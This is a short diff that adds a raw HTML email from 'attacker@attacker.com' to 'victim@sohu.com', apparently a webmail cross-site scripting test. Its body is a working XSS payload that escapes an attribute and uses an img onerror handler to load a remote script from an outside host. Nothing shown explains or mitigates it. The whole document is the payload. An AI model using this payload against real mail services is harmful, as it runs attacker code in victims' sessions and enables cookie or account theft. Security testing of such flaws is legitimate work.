@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: wtf1997
+To: victim@sohu.com
+MIME-Version: 1.0
+Content-type: text/html
+
+a"><img src='ice' onerror="loadScript('http://icefish1987.sinaapp.com/xss/probe.js')">
